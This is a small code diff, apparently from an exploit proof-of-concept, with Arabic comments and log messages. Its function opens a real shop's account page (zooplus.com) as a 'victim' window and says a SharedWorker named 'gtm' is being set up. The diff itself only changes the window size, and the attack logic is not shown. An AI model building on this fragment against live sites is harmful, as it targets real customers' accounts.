@@ -39,7 +39,7 @@
     function openVictim() {
         const victimUrl = "https://www.zooplus.com/account/overview"; // رابط موقع الضحية الذي يحتوي على الكود 2 و 3
         addLog("جاري فتح صفحة الضحية في نافذة جديدة...");
-        victimWindow = window.open(victimUrl, "_blank", "width=500,height=500");
+        victimWindow = window.open(victimUrl, "_blank");
         
         if (victimWindow) {
             addLog("تم فتح صفحة الضحية. الـ SharedWorker قيد الإنشاء الآن باسم 'gtm'...");
